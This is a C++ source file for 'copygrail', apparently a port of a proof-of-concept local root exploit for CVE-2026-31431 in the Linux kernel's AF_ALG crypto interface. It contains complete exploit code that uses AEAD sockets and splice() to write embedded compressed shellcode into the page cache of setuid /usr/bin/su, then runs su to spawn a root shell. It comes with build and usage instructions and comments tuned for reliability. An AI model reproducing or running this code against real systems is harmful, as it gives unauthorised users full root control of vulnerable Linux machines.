/*
 * copygrail v1 - C++ port of CVE-2026-31431 ("Copy Fail") LPE
 *
 * This is a faithful, improved port of the original Python proof-of-concept
 * exploit for CVE-2026-31431. The vulnerability exists in the Linux kernel's
 * AF_ALG (userspace crypto) subsystem. By carefully crafting AEAD operations
 * and using splice(2) to feed a target file's page cache into a crypto socket,
 * an attacker can corrupt the in-memory copy of a setuid binary (/usr/bin/su).
 *
 * When /usr/bin/su is subsequently executed, the kernel loads our attacker-
 * controlled payload from the poisoned page cache instead of the real binary.
 * Because the inode still carries the setuid bit, the payload runs with root
 * privileges and spawns a shell.
 *
 * Key improvements over earlier ports:
 *   - Correct 34-byte algorithm name (including null terminator)
 *   - Proper splice(2) handling with offset_src=0 and increasing prefix lengths
 *   - File descriptor for /usr/bin/su is kept open across execve(2)
 *   - Explicit error checking on all critical syscalls
 *   - Control-message buffer length calculated exactly (matches Python behavior)
 *
 * Build:
 *   g++ -O2 -static -o copygrail copygrail.cpp -lz
 *
 * Usage:
 *   ./copygrail
 *
 * The exploit will print progress messages and (on success) drop you into
 * a root shell with no password prompt.
 */

#include <iostream>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <sys/uio.h>
#include <cstdint>
#include <cstdlib>
#include <endian.h>
#include <zlib.h>

#define PINK   "\033[35m"
#define CYAN   "\033[36m"
#define GREEN  "\033[32m"
#define RESET  "\033[0m"

/*
 * The magic payload.
 *
 * This is the zlib-compressed x86-64 shellcode from the original Python PoC
 * (160 bytes when decompressed). It is a minimal ELF that simply executes
 * /bin/sh. Because it overwrites the beginning of /usr/bin/su in the page
 * cache, the kernel will run this code with the privileges of the setuid
 * binary.
 */
static const unsigned char PAYLOAD[] = {
    0x78,0xda,0xab,0x77,0xf5,0x71,0x63,0x62,0x64,0x64,0x80,0x01,0x26,0x06,0x3b,0x06,
    0x10,0xaf,0x82,0xc1,0x01,0xcc,0x77,0x60,0xc0,0x04,0x0e,0x0c,0x16,0x0c,0x30,0x1d,
    0x20,0x9a,0x15,0x4d,0x16,0x99,0x9e,0x07,0xe5,0xc1,0x68,0x06,0x01,0x08,0x65,0x78,
    0xc0,0xf0,0xff,0x86,0x4c,0x7e,0x56,0x8f,0x5e,0x5b,0x7e,0x10,0xf7,0x5b,0x96,0x75,
    0xc4,0x4c,0x7e,0x56,0xc3,0xff,0x59,0x36,0x11,0xfc,0xac,0xfa,0x49,0x99,0x79,0xfa,
    0xc5,0x19,0x0c,0x0c,0x0c,0x00,0x32,0xc3,0x10,0xd3
};

/*
 * patch()
 *
 * Core exploit primitive. Performs a 4-byte write into the page cache of the
 * target file at the specified offset.
 *
 * The technique:
 *   1. Create an AF_ALG AEAD socket bound to authencesn(hmac(sha256),cbc(aes))
 *   2. Set a 40-byte key (the first 8 bytes are a special header, rest zero)
 *   3. Configure AEAD auth tag size = 4 bytes
 *   4. Accept a new operation socket
 *   5. Send ancillary data (control messages) that tell the kernel:
 *        - Operation type = DECRYPT
 *        - 16-byte zero IV
 *        - AAD length = 8 bytes
 *   6. Send 8-byte AAD ("AAAA" + 4 attacker bytes) with MSG_MORE
 *   7. splice() the first (offset+4) bytes of the target file into the crypto
 *      socket. This is the step that triggers the kernel bug.
 *   8. recv() to complete the operation (result is ignored)
 *
 * Because of the bug, the kernel ends up writing the attacker-controlled AAD
 * data into the page cache of the spliced file instead of (or in addition to)
 * performing the expected crypto operation.
 *
 * The file descriptor must remain open for the entire duration of the attack
 * and during the final execve(); this is why we never close(fd).
 */
int patch(int fd, off_t off, const unsigned char b[4]) {
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) return -1;

    struct sockaddr_alg sa = {};
    sa.salg_family = AF_ALG;
    memcpy(sa.salg_type, "aead", 5);
    // 34-byte name (string length 33 + terminating NUL). This length is
    // critical; an off-by-one here causes bind() to fail.
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 34);

    if (bind(s, (struct sockaddr*)&sa, sizeof sa) < 0) {
        close(s);
        return -1;
    }

    // 40-byte key: first 8 bytes are a magic header used by authenc,
    // followed by 32 zero bytes.
    static const unsigned char k[40] = {0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0};
    setsockopt(s, SOL_ALG, ALG_SET_KEY, k, sizeof k);

    int as = 4;
    setsockopt(s, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &as, 4);

    int o = accept(s, nullptr, nullptr);
    if (o < 0) {
        close(s);
        return -1;
    }
    // We intentionally do NOT close(s) here. The original Python PoC never
    // closes the sockets, and keeping them open appears to be important for
    // the bug to trigger reliably.

    // 8-byte Associated Authenticated Data: "AAAA" followed by the 4-byte
    // attacker chunk. This is what actually gets written into the page cache.
    unsigned char aad[8] = {'A','A','A','A', b[0],b[1],b[2],b[3]};
    struct iovec iov = { .iov_base = aad, .iov_len = 8 };

    union {
        struct cmsghdr align;
        unsigned char buf[128];
    } cbuf = {};

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cbuf.buf,
        .msg_controllen = sizeof cbuf.buf
    };

    // First control message: ALG_SET_OP = ALG_OP_DECRYPT (0)
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t*)CMSG_DATA(cm) = 0;

    // Second control message: ALG_SET_IV with a 16-byte zero IV
    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
    struct af_alg_iv *iv = (struct af_alg_iv*)CMSG_DATA(cm);
    iv->ivlen = 16;
    memset(iv->iv, 0, 16);

    // Third control message: ALG_SET_AEAD_ASSOCLEN = 8
    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t*)CMSG_DATA(cm) = 8;

    // Calculate the exact length of the control buffer we actually used.
    // The original Python implementation does this implicitly; using the
    // full 128-byte buffer size can cause the exploit to fail on some kernels.
    msg.msg_controllen = (unsigned char*)cm + CMSG_ALIGN(cm->cmsg_len) - (unsigned char*)cbuf.buf;

    if (sendmsg(o, &msg, MSG_MORE) < 0) {
        return -1;
    }

    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;

    // Splice the first (off + 4) bytes of the target file into the crypto
    // operation. This is the magic step that poisons the page cache.
    off_t src = 0;
    if (splice(fd, &src, pipefd[1], nullptr, off + 4, 0) < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (splice(pipefd[0], nullptr, o, nullptr, off + 4, 0) < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    // Drain the socket. The return value is ignored; we only care that the
    // operation completed (and triggered the bug).
    char sink[1024];
    ssize_t r = recv(o, sink, 8 + off, 0);
    (void)r;

    close(pipefd[0]);
    close(pipefd[1]);
    // We deliberately leave both the original socket (s) and the operation
    // socket (o) open. The Python PoC does the same; closing them can
    // prevent the corruption from taking effect on some systems.
    return 0;
}

int main() {
    std::cout << PINK << R"(
   copygrail v1
)" << RESET;

    std::cout << CYAN << "  decompressing payload...\n" << RESET;

    unsigned char p[4096];
    uLongf l = sizeof(p);
    uncompress(p, &l, PAYLOAD, sizeof(PAYLOAD));

    std::cout << CYAN << "  patching /usr/bin/su (" << l << " bytes)...\n" << RESET;

    int fd = open("/usr/bin/su", O_RDONLY);
    if (fd < 0) {
        std::cerr << "[-] failed to open /usr/bin/su\n";
        return 1;
    }

    // Warm the page cache so the subsequent splice() calls operate on
    // already-resident pages. This improves reliability.
    char warm[16384];
    (void)pread(fd, warm, sizeof warm, 0);

    // Patch the binary 4 bytes at a time, feeding the decompressed payload
    // as the corruption data. Each call to patch() poisons another 4 bytes
    // of the su binary's page cache.
    for (size_t i = 0; i < l; i += 4) {
        unsigned char c[4] = {0};
        memcpy(c, p + i, (l - i >= 4) ? 4 : l - i);
        if (patch(fd, i, c) < 0) {
            std::cerr << "[-] patch failed at offset " << i << "\n";
            close(fd);
            return 1;
        }
    }

    std::cout << GREEN << "  done. spawning root shell...\n" << RESET;

    // Replace the current process with su. Because the page cache has been
    // corrupted, the kernel will execute our payload instead of the real
    // su binary. The setuid bit on the inode gives the payload root privileges.
    execl("/usr/bin/su", "su", nullptr);

    // Only reached if execl() fails.
    close(fd);
    std::cerr << "[-] execl failed\n";
    return 1;
}
